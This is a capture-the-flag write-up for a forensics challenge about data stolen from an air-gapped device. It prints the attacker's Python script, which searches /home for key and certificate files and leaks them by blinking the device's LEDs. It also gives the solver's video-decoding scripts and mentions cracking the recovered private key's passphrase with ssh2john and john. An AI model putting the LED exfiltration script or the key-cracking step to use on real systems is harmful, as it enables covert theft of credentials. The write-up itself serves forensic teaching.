# ExPiltration

**Writeup by: r41d3r**

## Problem

by Kev1n

Oh sh$t.. (!) Our network has been compromised and data stored on an air-gaped device stolen but we don't know exactly what has been extracted and how? We have 24/7 video surveillance in the server room and nobody has approched the device.. Here is all I have, could you please give us a hand?

forensic-data.zip

## Solution

**Summary**
- Identify exfiltration script: systemupdate.py
- View video - recognize lights are blinking binary code
- Python script using OpenCV to read the blinking light pattern
- Python script to extract binary data
- Convert to text with dcode.fr/en
- ssh2john to test private key
- certificatedecoder.dev to decode certificate
- flag in cert!

Here is the script found on the server that stole the data.

**systemupdate.py <- found on system**
```
import os
import time
import binascii

DELAY = 0.05

def init_leds():
	os.system("echo none > /sys/class/leds/led0/trigger")
	os.system("echo none > /sys/class/leds/led1/trigger")

def restore_leds():
	os.system("echo mmc0 > /sys/class/leds/led0/trigger")
	os.system("echo default-on > /sys/class/leds/led1/trigger")

def text_to_bits(text, encoding='utf-8', errors='surrogatepass'):
    bits = bin(int(binascii.hexlify(text.encode(encoding, errors)), 16))[2:]
    return bits.zfill(8 * ((len(bits) + 7) // 8))

def exfiltrate(data):
	stream = text_to_bits(data)
	for b in stream:
		if b=='0':
			os.system("echo 0 > /sys/class/leds/led0/brightness")
		else:
			os.system("echo 1 > /sys/class/leds/led0/brightness")

		time.sleep(DELAY)
		os.system("echo 1 > /sys/class/leds/led1/brightness")
		time.sleep(DELAY)
		os.system("echo 0 > /sys/class/leds/led1/brightness")
		time.sleep(DELAY)

def find_scret_file(path):
	files = []
	for r, d, f in os.walk(path):
		for file in f:
			if '.key' in file or '.crt' in file:
				files.append(os.path.join(r, file))

	for f in files:
		print("[+] Secret file discovered ({0}).. starting exfiltration".format(f))
		with open(f, 'r') as h:
			data = h.read()
		exfiltrate(data)

def main():

	init_leds()
	find_scret_file("/home")
	restore_leds()

if __name__ == '__main__':
	main()

```

Reading through this code shows us two things:
- the blinking lights are how the data was taken
- the blinking lights can be the code

The lights are blinking too fast to record by hadn.  Researching ways to have the computer read the blinking for me gets me to OpenCV .  Reading the docs and some pages give me some ideas for a script that watches both the lights and copies the frame by frame data.

**cv.py**
- converts blinking lights on video to binary bits
```
import numpy
import cv2

cap = cv2.VideoCapture('surv.mp4')

f = open('light_pattern.txt','w')

frame_num = 1

while(cap.isOpened()):
    ret, frame = cap.read()
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    led1tmp = 0
    led0tmp = 0
    if gray[550,717] > 200:
        led0tmp = 1
    if gray[550,736] > 200:
        led1tmp = 1
    print(led0tmp,led1tmp, frame_num)
    write_tmp = str(led0tmp) + "," + str(led1tmp) + "," + str(frame_num) + "\n"
    f.write(write_tmp)
    frame_num = frame_num + 1
    if ret==True:
        cv2.imshow('Frame',gray)
        if cv2.waitKey(25)&0xFF==ord('q'):
            break
    else:
        break
cap.release()

cv2.destroyAllWindows()

f.close()
```

And our output: 

**data sample from cv.py**
```
0,1,65419
0,1,65420
0,1,65421
0,1,65422
0,0,65423
0,0,65424
1,0,65425
1,0,65426
1,0,65427
1,0,65428
1,1,65429
1,1,65430
1,1,65431
1,1,65432
1,0,65433
1,0,65434
1,0,65435
1,0,65436
1,0,65437
1,0,65438
1,1,65439
1,1,65440
1,1,65441
1,1,65442
1,0,65443
1,0,65444
1,0,65445
1,0,65446
0,0,65447
0,0,65448
0,1,65449
0,1,65450
0,1,65451
0,1,65452
0,1,65453
0,1,65454
1,0,65455
```

Going back to systemupdate.py it shows that the lights blink in a specific pattern and a script that reads the state of led0 at the time that led1 changes from dark to light will recreate the binary data.  Here is the script I came up with:

**change.py**
- converts binary bits from video to binary code
```
f = open('light_pattern.txt', 'r')

lst = []

tmp = '1'

new_list = []
new_str = ''

for line in f:
    data = line.replace('\n', '')
    data = data.split(',')
    if data[1] == '1':
        if tmp == '0':
            print(data[0])
            new_str = new_str + data[0]
            if len(new_str) == 8:
                if new_str[0] == '1':
                    new_str = new_str[1:]
                else:
                    new_list.append(new_str)
                    new_str = ''
    tmp = data[1]
f.close()

print(new_str)

f = open('bin_pattern.txt', 'w')
for i in range(0,len(new_list)):
    f.write(new_list[i])
f.close()

```

Sample output:

```
001011010010110100101101001011010010110101000010010001010100011101001001010011100010000001010010010100110100000100100000010100000101
```

**Converting the Ascii**
I did this the lazy way and used dcode.fr to conver from binary to ascii.  This gave a doc with the private key and cert recreated.

**Testing the private key**
- used ssh2john to convert the private key to hash
- john finds password: 1234

**Testing the cert**
- used certificatedecoder.dev to convert the cert to plaintext
- conversion shows flag!
